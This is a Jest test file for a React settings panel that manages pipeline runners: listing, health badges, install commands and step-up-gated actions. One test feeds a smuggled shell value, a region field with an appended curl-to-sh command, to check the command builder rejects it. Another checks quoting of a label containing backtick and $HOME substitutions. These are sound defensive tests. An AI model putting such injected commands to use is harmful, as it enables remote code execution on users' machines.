// Copyright 2026 Pipeline Builder Contributors
// SPDX-License-Identifier: Apache-2.0

/**
 * Settings → Organization → Pipeline runners.
 *
 *  - Own runners: health badge, version, regions, last delivery,
 *    the Function URL only when the API returns it; Test / Rename / Share /
 *    Revoke, each through ONE StepUpModal that forwards its token.
 *  - Turning sharing ON (widening) needs the dialog's checkbox; OFF does not.
 *  - Revoke: the step-up dialog is the confirmation (cancel = no call).
 *  - Inherited runners: read-only, "Managed by <fromOrgName>".
 *  - `available: false` / 409 RUNNERS_UNAVAILABLE render nothing.
 *  - Install instructions: the setup-runner command (push only) and the
 *    one-runner-per-account rule; each runner card carries its OWN JWKS URL.
 *  - "Used by N pipelines" with the list, and unhealthy-runner banners.
 * (The Signing key card has its own suite: runner-signing-key-card.test.tsx.)
 */

import { describe, it, expect, jest, beforeEach } from '@jest/globals';
import type { AnyFn } from './helpers/mock-fn';
import { render, screen, fireEvent, waitFor, within } from '@testing-library/react';
import { PipelineRunnersSettings } from '../src/components/settings/PipelineRunnersSettings';
import { ApiError, MfaRequiredError, StepUpRequiredError } from '../src/lib/api/errors';
import { ONE_RUNNER_PER_ACCOUNT_COPY, PIPELINE_RUNNERS_ANCHOR, PIPELINE_RUNNERS_HREF, RUNNER_ERROR_COPY, setupRunnerCommand } from '../src/lib/pipeline-runners';
import type { PipelineRunner, PipelineRunnersDto } from '../src/lib/api/domains/pipelines';
import { pageToast } from './helpers/pageMocks';

jest.mock('@/components/ui/Toast', () => require('./helpers/pageMocks').toastModule());

// The step-up dialog has its own suite; here it renders its copy and confirms
// with a fixed token.
jest.mock('@/components/admin/StepUpModal', () => ({
  __esModule: true,
  StepUpModal: ({ onConfirmed, onClose, details, title, confirmDisabledReason }: {
    onConfirmed: (t: string) => Promise<void> | void; onClose: () => void; details?: React.ReactNode; title?: string;
    confirmDisabledReason?: string | null;
  }) => (
    <div data-testid="stepup-modal">
      <h2>{title}</h2>
      {details}
      <button type="button" disabled={!!confirmDisabledReason} onClick={async () => { await onConfirmed('tok'); onClose(); }}>Confirm step-up</button>
      <button type="button" onClick={onClose}>Cancel step-up</button>
    </div>
  ),
}));

const api = {
  getPipelineRunners: jest.fn<AnyFn>(),
  updatePipelineRunner: jest.fn<AnyFn>(),
  testPipelineRunner: jest.fn<AnyFn>(),
  revokePipelineRunner: jest.fn<AnyFn>(),
  getRunnerPipelines: jest.fn<AnyFn>(),
};
jest.mock('@/lib/api', () => ({
  __esModule: true,
  default: new Proxy({}, { get: (_t, k: string) => (...a: unknown[]) => (api as Record<string, AnyFn>)[k]?.(...a) }),
}));

const jwksOf = (id: string) => `https://pb.example.com/api/pipelines/runner/runners/${id}/jwks.json`;
const FN_URL = 'https://abc123.lambda-url.us-east-1.on.aws/';
const runner = (over: Partial<PipelineRunner> = {}): PipelineRunner => ({
  id: 'r1', orgId: 'org-1', label: 'Production', functionUrl: FN_URL, shareWithTeams: false,
  version: '1.2.0', regions: ['us-east-1', 'eu-west-2'], health: 'healthy', status: 'active',
  lastDeliveryAt: '2026-11-17T00:00:00Z', createdAt: '2026-11-01T00:00:00Z', updateRequired: false,
  jwksUrl: jwksOf(over.id ?? 'r1'), pipelineCount: 0,
  capabilities: [], shareDeploysWithTeams: false, pipelinePrefixes: [],
  ...over,
});
const dto = (over: Partial<PipelineRunnersDto> = {}): PipelineRunnersDto => ({
  available: true, unavailableReason: null, platformEgressIps: null, own: [runner()], inherited: [], signingKey: null, ...over,
});
const ok = (data: unknown) => ({ success: true, data });

beforeEach(() => {
  jest.clearAllMocks();
  api.getPipelineRunners.mockResolvedValue(ok(dto()));
  api.updatePipelineRunner.mockResolvedValue(ok({ runner: runner() }));
  api.testPipelineRunner.mockResolvedValue(ok({ ok: true, outcome: 'pong' }));
  api.revokePipelineRunner.mockResolvedValue(ok({ runner: runner({ status: 'revoked' }) }));
});

const dialog = () => screen.getByTestId('stepup-modal');
const confirmStepUp = () => fireEvent.click(within(dialog()).getByRole('button', { name: 'Confirm step-up' }));

describe('PipelineRunnersSettings — what it shows', () => {
  it('renders nothing when the deployment has runners off (available: false)', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ available: false, own: [] })));
    const { container } = render(<PipelineRunnersSettings orgId="org-1" />);
    await waitFor(() => expect(api.getPipelineRunners).toHaveBeenCalled());
    await waitFor(() => expect(container).toBeEmptyDOMElement());
  });

  it('renders nothing on 409 RUNNERS_UNAVAILABLE, but offers a retry on any other read failure', async () => {
    api.getPipelineRunners.mockRejectedValue(new ApiError('off', 409, 'RUNNERS_UNAVAILABLE'));
    const { container, unmount } = render(<PipelineRunnersSettings orgId="org-1" />);
    await waitFor(() => expect(api.getPipelineRunners).toHaveBeenCalled());
    await waitFor(() => expect(container).toBeEmptyDOMElement());
    unmount();
    api.getPipelineRunners.mockRejectedValue(new ApiError('boom', 500, 'INTERNAL'));
    render(<PipelineRunnersSettings orgId="org-1" />);
    expect(await screen.findByRole('button', { name: 'Retry' })).toBeInTheDocument();
  });

  it('is anchored for the pipeline page\'s links', async () => {
    const { container } = render(<PipelineRunnersSettings orgId="org-1" />);
    expect(await screen.findByText('Pipeline runners')).toBeInTheDocument();
    expect(PIPELINE_RUNNERS_HREF).toBe(`/dashboard/settings?tab=organization&section=pipelines#${PIPELINE_RUNNERS_ANCHOR}`);
    expect(container.querySelector(`#${PIPELINE_RUNNERS_ANCHOR}`)).not.toBeNull();
  });

  it('lists an own runner with version, regions, last delivery and its controls — no mode', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    const row = await screen.findByTestId('runner-r1');
    expect(within(row).getByText('Production')).toBeInTheDocument();
    expect(within(row).queryByText(/Push|Poll/)).not.toBeInTheDocument();
    const meta = within(row).getByTestId('runner-meta-r1');
    expect(meta).toHaveTextContent('Version 1.2.0');
    expect(meta).toHaveTextContent('Regions us-east-1, eu-west-2');
    expect(meta).toHaveTextContent('Last delivery');
    for (const name of ['Test', 'Rename', 'Revoke']) expect(within(row).getByRole('button', { name })).toBeInTheDocument();
    expect(within(row).getByRole('switch')).toHaveAttribute('aria-checked', 'false');
  });

  it('a runner never delivered to says so', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ lastDeliveryAt: null })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    const meta = await screen.findByTestId('runner-meta-r1');
    expect(meta).toHaveTextContent('Last delivery never');
    expect(meta).not.toHaveTextContent(/Last seen/);
  });

  it('shows the Function URL only when the API returns it', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({
      own: [runner(), runner({ id: 'r2', label: 'Staging', functionUrl: null })],
    })));
    const { container } = render(<PipelineRunnersSettings orgId="org-1" />);
    expect(await screen.findByTestId('runner-url-r1')).toHaveTextContent(FN_URL);
    expect(screen.queryByTestId('runner-url-r2')).not.toBeInTheDocument();
    expect(container.textContent?.split(FN_URL).length).toBe(2); // exactly once
  });

  it('badges each health: Healthy / Unreachable / Revoked (revoked has no controls)', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [
      runner({ id: 'a', health: 'healthy' }),
      runner({ id: 'b', health: 'unreachable' }),
      runner({ id: 'd', health: 'healthy', status: 'revoked' }),
    ] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    expect(within(await screen.findByTestId('runner-a')).getByText('Healthy')).toBeInTheDocument();
    expect(within(screen.getByTestId('runner-b')).getByText('Unreachable')).toBeInTheDocument();
    const revoked = screen.getByTestId('runner-d');
    expect(within(revoked).getByText('Revoked')).toBeInTheDocument();
    // No write control (the Function URL's copy button is not one).
    expect(within(revoked).queryAllByRole('button').filter((b) => !/^Copy /.test(b.getAttribute('aria-label') ?? ''))).toHaveLength(0);
    expect(within(revoked).queryByRole('switch')).not.toBeInTheDocument();
  });

  it('a pending runner reads "Setup not finished" and offers no Test (rename / share / revoke stay)', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ status: 'pending', lastDeliveryAt: null })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    const row = await screen.findByTestId('runner-r1');
    expect(within(row).getByText('Setup not finished')).toBeInTheDocument();
    expect(within(row).queryByText('Healthy')).not.toBeInTheDocument();
    expect(within(row).queryByRole('button', { name: 'Test' })).not.toBeInTheDocument();
    for (const name of ['Rename', 'Revoke']) expect(within(row).getByRole('button', { name })).toBeInTheDocument();
    expect(within(row).getByRole('switch')).toBeInTheDocument();
  });

  it('"Update required": a badge and the setup-runner instruction, own and inherited', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({
      own: [runner({ updateRequired: true }), runner({ id: 'r2', label: 'Staging' })],
      inherited: [{ ...runner({ id: 'p1', functionUrl: null, updateRequired: true }), fromOrgId: 'root', fromOrgName: 'Acme Root' }],
    })));
    render(<PipelineRunnersSettings orgId="team-1" />);
    const row = await screen.findByTestId('runner-r1');
    expect(within(row).getByText('Update required')).toBeInTheDocument();
    expect(within(row).getByTestId('runner-update-r1')).toHaveTextContent('Re-run pipeline-manager infra setup-runner to update');
    expect(within(screen.getByTestId('runner-r2')).queryByText('Update required')).not.toBeInTheDocument();
    expect(within(screen.getByTestId('runner-inherited-p1')).getByText('Update required')).toBeInTheDocument();
  });

  it('shows the platform egress IPs (copyable) and the API Gateway command when the server knows them', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [], platformEgressIps: ['203.0.113.10', '198.51.100.0/24', '2001:db8::1'] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    const egress = await screen.findByTestId('runner-egress');
    expect(egress).toHaveTextContent('203.0.113.10/32 198.51.100.0/24 2001:db8::1/128');
    expect(within(egress).getByRole('button', { name: 'Copy the platform egress addresses' })).toBeInTheDocument();
    expect(egress).toHaveTextContent('pipeline-manager infra setup-runner --region us-east-1 --api-gateway --allow-ip 203.0.113.10/32 198.51.100.0/24 2001:db8::1/128');
  });

  it('no egress section when the server does not know its egress IPs', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [], platformEgressIps: null })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    await screen.findByTestId('runner-install');
    expect(screen.queryByTestId('runner-egress')).not.toBeInTheDocument();
  });

  it('lists inherited runners read-only, "Managed by" their owner, without a Function URL', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({
      inherited: [{ ...runner({ id: 'p1', label: 'Shared prod', orgId: 'root', functionUrl: null, shareWithTeams: true }), fromOrgId: 'root', fromOrgName: 'Acme Root' }],
    })));
    render(<PipelineRunnersSettings orgId="team-1" />);
    const inherited = await screen.findByTestId('runner-inherited-p1');
    expect(within(inherited).getByText('Shared prod')).toBeInTheDocument();
    expect(within(inherited).getByText('Managed by Acme Root')).toBeInTheDocument();
    expect(within(inherited).getByText('Healthy')).toBeInTheDocument();
    // Signed with the owner's key, whatever this team's key mode.
    expect(within(inherited).getByTestId('runner-inherited-key-p1')).toHaveTextContent("Uses Acme Root's signing key");
    expect(within(inherited).getByTestId('runner-jwks-p1')).toHaveTextContent(jwksOf('p1'));
    // No write control (its JWKS URL's copy button is not one).
    expect(within(inherited).queryAllByRole('button').filter((b) => !/^Copy /.test(b.getAttribute('aria-label') ?? ''))).toHaveLength(0);
    expect(within(inherited).queryByRole('switch')).not.toBeInTheDocument();
  });

  it('install instructions: the setup-runner command (no --mode) and the one-runner-per-account rule (open by default with no runners)', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    const install = await screen.findByTestId('runner-install');
    expect(screen.getByText('No pipeline runners')).toBeInTheDocument();
    expect(screen.getByText('Pipelines cannot run until a runner is installed in their AWS account.')).toBeInTheDocument();
    expect(install).toHaveTextContent('pipeline-manager infra setup-runner --region us-east-1');
    expect(install).not.toHaveTextContent(/--mode|poll/i);
    expect(within(install).getByTestId('runner-install-one-per-account')).toHaveTextContent(ONE_RUNNER_PER_ACCOUNT_COPY);
    expect(ONE_RUNNER_PER_ACCOUNT_COPY).toMatch(/one runner per AWS account/i);
    // No shared, deployment-wide JWKS URL any more.
    expect(install).not.toHaveTextContent('/api/pipelines/runner/jwks.json');
    fireEvent.change(within(install).getByLabelText('AWS region'), { target: { value: 'eu-west-2' } });
    fireEvent.change(within(install).getByLabelText('Runner label (optional)'), { target: { value: 'Prod' } });
    expect(install).toHaveTextContent('pipeline-manager infra setup-runner --region eu-west-2 --label \'Prod\'');
    expect(setupRunnerCommand({ region: '' })).toBe('pipeline-manager infra setup-runner --region <region>');
  });

  it('install instructions never put an invalid region into the copyable command', async () => {
    // The field is free text and the command is pasted into a shell: a value
    // that is not a region code shows the placeholder, not the raw input.
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    const install = await screen.findByTestId('runner-install');
    fireEvent.change(within(install).getByLabelText('AWS region'), { target: { value: 'us-east-1;curl$IFS-s$IFS//x|sh' } });
    expect(install).toHaveTextContent('is not an AWS region code');
    const commands = within(install).getAllByText(/pipeline-manager infra setup-runner/);
    expect(commands.length).toBeGreaterThan(0);
    for (const c of commands) {
      expect(c.textContent).not.toContain('curl');
      expect(c.textContent).toContain('--region <region>');
    }
  });

  it('install instructions are collapsed behind "Install a runner" once there is a runner', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    await screen.findByTestId('runner-r1');
    expect(screen.queryByTestId('runner-install')).not.toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'Install a runner' }));
    expect(screen.getByTestId('runner-install')).toBeInTheDocument();
  });
});

describe('PipelineRunnersSettings — revoked runners do not count as installed', () => {
  it('an org whose only runner is revoked gets the install instructions open, the empty state and the no-runner key copy', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({
      own: [runner({ status: 'revoked' })],
      signingKey: {
        mode: 'own', isRootOrg: true, active: null, next: null, retiring: null, rotation: 'none', inheritedFrom: null,
        inheritingTeams: 0, inheritingTeamNames: [], inheritingRunners: 0, transition: null, unreadable: false, maxAgeDays: 365,
      },
    })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    await screen.findByTestId('runner-r1');
    expect(screen.getByTestId('runner-install')).toBeInTheDocument();
    expect(screen.getByText('No pipeline runners')).toBeInTheDocument();
    expect(screen.getByTestId('key-none')).toHaveTextContent('A signing key is created when you register your first runner.');
  });
});

describe('PipelineRunnersSettings — writes (step-up gated)', () => {
  it('rename: PATCH { label } with the step-up token, then re-read', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Rename' }));
    const form = screen.getByRole('form', { name: 'Rename Production' });
    fireEvent.change(within(form).getByLabelText('Label'), { target: { value: 'Prod (us)' } });
    fireEvent.click(within(form).getByRole('button', { name: 'Save' }));
    expect(api.updatePipelineRunner).not.toHaveBeenCalled(); // not before the step-up
    expect(dialog()).not.toHaveTextContent(/widens/);
    confirmStepUp();
    await waitFor(() => expect(api.updatePipelineRunner).toHaveBeenCalledWith('r1', { label: 'Prod (us)' }, 'tok'));
    await waitFor(() => expect(api.getPipelineRunners).toHaveBeenCalledTimes(2));
    expect(pageToast.success).toHaveBeenCalledWith('Runner renamed to Prod (us)');
  });

  it('turning sharing ON widens: the dialog\'s checkbox must be ticked before the step-up', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(within(await screen.findByTestId('runner-r1')).getByRole('switch'));
    expect(dialog()).toHaveTextContent(/This widens who may use this runner/);
    expect(dialog()).toHaveTextContent(/Every team/);
    const confirmBtn = within(dialog()).getByRole('button', { name: 'Confirm step-up' });
    expect(confirmBtn).toBeDisabled();
    fireEvent.click(confirmBtn);
    expect(api.updatePipelineRunner).not.toHaveBeenCalled();
    fireEvent.click(within(dialog()).getByRole('checkbox', { name: /I understand/ }));
    expect(confirmBtn).not.toBeDisabled();
    confirmStepUp();
    await waitFor(() => expect(api.updatePipelineRunner).toHaveBeenCalledWith('r1', { shareWithTeams: true }, 'tok'));
  });

  it('turning sharing OFF narrows: no checkbox, straight to the step-up', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ shareWithTeams: true })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(within(await screen.findByTestId('runner-r1')).getByRole('switch'));
    expect(within(dialog()).queryByRole('checkbox')).not.toBeInTheDocument();
    expect(within(dialog()).getByRole('button', { name: 'Confirm step-up' })).not.toBeDisabled();
    confirmStepUp();
    await waitFor(() => expect(api.updatePipelineRunner).toHaveBeenCalledWith('r1', { shareWithTeams: false }, 'tok'));
  });

  it('the widening tick does not carry over to the next dialog', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    const sw = within(await screen.findByTestId('runner-r1')).getByRole('switch');
    fireEvent.click(sw);
    fireEvent.click(within(dialog()).getByRole('checkbox', { name: /I understand/ }));
    fireEvent.click(within(dialog()).getByRole('button', { name: 'Cancel step-up' }));
    fireEvent.click(sw);
    expect(within(dialog()).getByRole('button', { name: 'Confirm step-up' })).toBeDisabled();
  });

  it('test: POST …/test with the token; a pong shows success', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Test' }));
    expect(screen.getByRole('heading', { name: 'Test Production?' })).toBeInTheDocument();
    confirmStepUp();
    await waitFor(() => expect(api.testPipelineRunner).toHaveBeenCalledWith('r1', 'tok'));
    expect(await screen.findByTestId('runner-test-result-r1')).toHaveTextContent(/The runner answered \(pong\)/);
    expect(pageToast.success).toHaveBeenCalledWith('Production answered');
  });

  it('test: a failed ping shows the error code\'s copy', async () => {
    api.testPipelineRunner.mockResolvedValue(ok({ ok: false, errorCode: 'SIGNATURE_INVALID' }));
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Test' }));
    confirmStepUp();
    const result = await screen.findByTestId('runner-test-result-r1');
    expect(result).toHaveTextContent('Test failed');
    expect(result).toHaveTextContent(RUNNER_ERROR_COPY.SIGNATURE_INVALID.title);
  });

  it('revoke: the step-up dialog is the confirmation; cancel makes no call, confirm DELETEs', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Revoke' }));
    expect(screen.getByRole('heading', { name: 'Revoke Production?' })).toBeInTheDocument();
    expect(dialog()).toHaveTextContent(/cannot be undone/);
    expect(dialog()).toHaveTextContent('pipeline-manager infra setup-runner --delete');
    fireEvent.click(screen.getByRole('button', { name: 'Cancel step-up' }));
    expect(api.revokePipelineRunner).not.toHaveBeenCalled();
    fireEvent.click(screen.getByRole('button', { name: 'Revoke' }));
    confirmStepUp();
    await waitFor(() => expect(api.revokePipelineRunner).toHaveBeenCalledWith('r1', 'tok'));
    await waitFor(() => expect(api.getPipelineRunners).toHaveBeenCalledTimes(2));
  });

  it('a step-up refusal the global dialog takes over is not an error, and re-reads on replay', async () => {
    const refusal = new StepUpRequiredError('Step-up required', 'STEP_UP_REQUIRED');
    refusal.attachResume(Promise.resolve({ success: true, data: {} }));
    api.revokePipelineRunner.mockRejectedValue(refusal);
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Revoke' }));
    confirmStepUp();
    await waitFor(() => expect(api.getPipelineRunners).toHaveBeenCalledTimes(2));
    expect(screen.queryByText(/Step-up required/)).not.toBeInTheDocument();
  });

  it('an MFA_REQUIRED refusal is left to the shell\'s dialog (no second error here)', async () => {
    api.testPipelineRunner.mockRejectedValue(new MfaRequiredError('Two-factor authentication required', 'MFA_REQUIRED'));
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Test' }));
    confirmStepUp();
    await waitFor(() => expect(api.testPipelineRunner).toHaveBeenCalled());
    await waitFor(() => expect(screen.queryByTestId('stepup-modal')).not.toBeInTheDocument());
    expect(screen.queryByText(/Two-factor authentication required/)).not.toBeInTheDocument();
  });

  it('any other refusal is shown', async () => {
    api.testPipelineRunner.mockRejectedValue(new ApiError('Too many tests — try again in a minute', 429, 'RATE_LIMITED'));
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Test' }));
    confirmStepUp();
    expect(await screen.findByText(/Too many tests/)).toBeInTheDocument();
  });

  it('read-only sessions get no working write controls', async () => {
    render(<PipelineRunnersSettings orgId="org-1" readOnly />);
    const row = await screen.findByTestId('runner-r1');
    for (const name of ['Test', 'Rename', 'Revoke']) {
      const b = within(row).getByRole('button', { name });
      expect(b.hasAttribute('disabled') || b.getAttribute('aria-disabled') === 'true').toBe(true);
    }
    expect(within(row).getByRole('switch')).toBeDisabled();
  });
});

describe('PipelineRunnersSettings — review fixes', () => {
  it.each([
    ['timeout', /did not answer in time/],
    ['conn_refused', /could not connect/],
    ['dns_nxdomain', /no longer exists/],
    ['aws_403_url_gone', /AWS refused the request before it reached the runner/],
    ['http_5xx', /failed while answering/],
    ['http_429', /throttled/],
  ])('a failed ping\'s delivery failure class %s gets its own copy, not "It answered <code>"', async (code, copy) => {
    api.testPipelineRunner.mockResolvedValue(ok({ ok: false, errorCode: code }));
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Test' }));
    confirmStepUp();
    const result = await screen.findByTestId('runner-test-result-r1');
    expect(result).toHaveTextContent(copy);
    expect(result).not.toHaveTextContent(`It answered ${code}`);
  });

  it('the Function URL, the egress CIDRs and the runner\'s JWKS URL each have their own, distinctly labelled copy button', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ platformEgressIps: ['203.0.113.10'] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    const url = await screen.findByTestId('runner-url-r1');
    expect(within(url).getByRole('button', { name: 'Copy the Function URL of Production' })).toBeInTheDocument();
    expect(within(screen.getByTestId('runner-jwks-r1')).getByRole('button', { name: 'Copy the JWKS URL of Production' })).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'Install a runner' }));
    expect(within(screen.getByTestId('runner-egress')).getByRole('button', { name: 'Copy the platform egress addresses' })).toBeInTheDocument();
  });

  it('the install command quotes the label for a POSIX shell: $, backticks and quotes stay literal', () => {
    expect(setupRunnerCommand({ region: 'us-east-1', label: 'Team $HOME `id` "x"' }))
      .toBe('pipeline-manager infra setup-runner --region us-east-1 --label \'Team $HOME `id` "x"\'');
    expect(setupRunnerCommand({ region: 'us-east-1', label: "Bob's" }))
      .toBe("pipeline-manager infra setup-runner --region us-east-1 --label 'Bob'\\''s'");
  });
});

describe('PipelineRunnersSettings — per-runner keys, linked pipelines, health', () => {
  it('each runner card shows its OWN JWKS URL', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner(), runner({ id: 'r2', label: 'Staging' })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    expect(await screen.findByTestId('runner-jwks-r1')).toHaveTextContent(jwksOf('r1'));
    expect(screen.getByTestId('runner-jwks-r2')).toHaveTextContent(jwksOf('r2'));
  });

  it('"Used by N pipelines" opens the list of linked pipelines, each a link to its page', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ pipelineCount: 12 })] })));
    api.getRunnerPipelines.mockResolvedValue(ok({
      pipelines: [{ id: 'p1', name: 'acme-web' }, { id: 'p2', name: 'acme-api' }],
      pagination: { total: 12, limit: 50, offset: 0, hasMore: true },
    }));
    render(<PipelineRunnersSettings orgId="org-1" />);
    const used = await screen.findByRole('button', { name: 'Used by 12 pipelines' });
    expect(api.getRunnerPipelines).not.toHaveBeenCalled(); // read only once opened
    fireEvent.click(used);
    await waitFor(() => expect(api.getRunnerPipelines).toHaveBeenCalledWith('r1', { limit: 50 }, expect.anything()));
    const list = await screen.findByTestId('runner-pipelines-list-r1');
    expect(within(list).getByRole('link', { name: 'acme-web' })).toHaveAttribute('href', '/dashboard/pipelines/p1');
    expect(within(list).getByRole('link', { name: 'acme-api' })).toHaveAttribute('href', '/dashboard/pipelines/p2');
    expect(list).toHaveTextContent('and 10 more');
  });

  it('a runner with no linked pipelines says so (no list to open)', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    expect(await screen.findByTestId('runner-pipelines-r1')).toHaveTextContent('No pipelines linked yet');
    expect(screen.queryByRole('button', { name: /Used by/ })).not.toBeInTheDocument();
  });

  it('revoking a runner names how many pipelines are affected', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ pipelineCount: 3 })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('button', { name: 'Revoke' }));
    expect(within(dialog()).getByTestId('runner-revoke-affected')).toHaveTextContent('3 pipelines linked to it will need another runner.');
  });

  it('an unhealthy runner: a panel banner, and on its card the last successful contact, the pipelines affected and a Test button', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ health: 'unreachable', pipelineCount: 4 }), runner({ id: 'r2', label: 'Staging' })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    expect(await screen.findByTestId('runners-unhealthy-banner')).toHaveTextContent('Production');
    expect(screen.getByTestId('runners-unhealthy-banner')).not.toHaveTextContent('Staging');
    const banner = screen.getByTestId('runner-unhealthy-r1');
    expect(banner).toHaveTextContent('Last successful contact');
    expect(banner).toHaveTextContent('4 pipelines cannot run until it answers again.');
    expect(screen.queryByTestId('runner-unhealthy-r2')).not.toBeInTheDocument();
    fireEvent.click(within(banner).getByRole('button', { name: 'Test' }));
    confirmStepUp();
    await waitFor(() => expect(api.testPipelineRunner).toHaveBeenCalledWith('r1', 'tok'));
  });

  it('no banner while every runner answers', async () => {
    render(<PipelineRunnersSettings orgId="org-1" />);
    await screen.findByTestId('runner-r1');
    expect(screen.queryByTestId('runners-unhealthy-banner')).not.toBeInTheDocument();
  });
});

describe('PipelineRunnersSettings — deploys through a runner', () => {
  it('a runner set up with --enable-deploy is badged "Deploys enabled"; one without is not', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ capabilities: ['deploy:1'] }), runner({ id: 'r2', label: 'Staging' })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    const card = await screen.findByTestId('runner-r1');
    expect(within(card).getByText('Deploys enabled')).toBeInTheDocument();
    expect(within(screen.getByTestId('runner-r2')).queryByText('Deploys enabled')).not.toBeInTheDocument();
  });

  it('"Teams may deploy through it": PATCH { shareDeploysWithTeams } behind the step-up, ON needs the widening tick', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ capabilities: ['deploy:1'], shareWithTeams: true })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('switch', { name: /Teams may deploy through it/ }));
    expect(within(dialog()).getByRole('heading')).toHaveTextContent(/Let teams deploy through Production/);
    expect(within(dialog()).getByText(/deploy their pipelines into this AWS account/)).toBeInTheDocument();
    expect(within(dialog()).getByRole('button', { name: 'Confirm step-up' })).toBeDisabled();
    fireEvent.click(within(dialog()).getByRole('checkbox'));
    confirmStepUp();
    await waitFor(() => expect(api.updatePipelineRunner).toHaveBeenCalledWith('r1', { shareDeploysWithTeams: true }, 'tok'));
  });

  it('turning team deploys OFF needs no tick', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [runner({ capabilities: ['deploy:1'], shareWithTeams: true, shareDeploysWithTeams: true })] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    fireEvent.click(await screen.findByRole('switch', { name: /Teams may deploy through it/ }));
    confirmStepUp();
    await waitFor(() => expect(api.updatePipelineRunner).toHaveBeenCalledWith('r1', { shareDeploysWithTeams: false }, 'tok'));
  });

  it('the team-deploys toggle needs deploys enabled and the runner shared with teams', async () => {
    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [
      runner({ capabilities: ['deploy:1'], shareWithTeams: false }),
      runner({ id: 'r2', label: 'Staging', capabilities: [], shareWithTeams: true }),
    ] })));
    render(<PipelineRunnersSettings orgId="org-1" />);
    await screen.findByTestId('runner-r1');
    expect(screen.queryByRole('switch', { name: /Teams may deploy through it/ })).not.toBeInTheDocument();
  });
});
